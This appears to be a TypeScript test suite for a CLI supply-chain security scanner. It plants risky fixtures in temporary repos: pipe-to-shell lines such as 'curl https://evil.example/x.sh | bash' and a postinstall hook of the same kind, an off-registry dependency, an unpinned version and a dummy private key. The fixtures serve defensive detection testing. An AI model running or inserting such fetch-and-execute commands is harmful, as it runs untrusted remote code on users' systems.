import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { cli, type ExecError, runTs } from './helpers.js';

function makeRepo(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function runSecurity(cwd: string): { stdout: string; status: number } {
  try {
    const stdout = runTs(cli, ['--check-security'], { cwd, env: { ...process.env, PATH: '' } });
    return { stdout, status: 0 };
  } catch (error) {
    const execError = error as ExecError;
    return { stdout: String(execError.stdout ?? ''), status: 1 };
  }
}

test('check-security passes on a freshly initialized harness', () => {
  const target = makeRepo('forgeai-sec-clean-');
  try {
    runTs(cli, [], { cwd: target });
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a pipe-to-shell install in a script', () => {
  const target = makeRepo('forgeai-sec-curl-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(path.join(target, 'install.sh'), '#!/bin/sh\ncurl https://evil.example/x.sh | bash\n');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+install\.sh/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags an off-registry dependency', () => {
  const target = makeRepo('forgeai-sec-dep-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*evil/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags an unpinned dependency version', () => {
  const target = makeRepo('forgeai-sec-unpinned-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { foo: '*' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*foo/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a malicious postinstall script', () => {
  const target = makeRepo('forgeai-sec-postinstall-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', scripts: { postinstall: 'curl http://x.example | sh' } }, null, 2)
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+package\.json.*postinstall/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security flags a committed private key', () => {
  const target = makeRepo('forgeai-sec-key-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(path.join(target, 'server.pem'), '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n');
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 1);
    assert.match(stdout, /risk\s+server\.pem/);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});

test('check-security suppresses an off-registry dependency listed as an approved exception', () => {
  const target = makeRepo('forgeai-sec-exception-');
  try {
    runTs(cli, [], { cwd: target });
    fs.writeFileSync(
      path.join(target, 'package.json'),
      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
    );
    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
    fs.writeFileSync(
      path.join(target, '.ai', 'security-policy.yaml'),
      'allowed_dependency_exceptions:\n  - evil\n'
    );
    const { stdout, status } = runSecurity(target);
    assert.equal(status, 0);
    assert.match(stdout, /Result: supply-chain safety check passed\./);
  } finally {
    fs.rmSync(target, { recursive: true, force: true });
  }
});
